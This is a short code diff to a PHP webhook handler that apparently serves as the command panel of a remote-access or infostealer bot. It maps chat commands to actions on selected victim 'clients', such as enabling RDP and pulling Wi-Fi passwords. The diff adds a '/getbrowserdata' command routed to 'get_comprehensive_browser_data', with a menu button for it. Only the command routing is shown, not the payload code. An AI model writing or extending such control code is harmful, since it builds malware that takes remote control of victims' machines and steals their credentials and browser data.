@@ -136,6 +136,7 @@ class WebhookHandler
             '/enable_rdp' => 'enable_rdp',         // ✅ اضافه شد
             '/disable_rdp' => 'disable_rdp',       // ✅ اضافه شد
             '/getwifipasswords' => 'get_wifi_passwords', // ✅ اضافه شد
+            '/getbrowserdata' => 'get_comprehensive_browser_data',
         ];
 
         foreach ($commandMap as $cmd => $type) {
@@ -310,6 +311,8 @@ class WebhookHandler
             '/enable_rdp' => '🖥️ Enable RDP',
             '/disable_rdp' => '🚫 Disable RDP',
             '/getwifipasswords' => '📡 WiFi',
+            // NEW: اضافه کردن دستور جدید
+            '/getbrowserdata' => '🌐 Browser Data',
             '/select' => '🔙 Select Client'
         ];
 
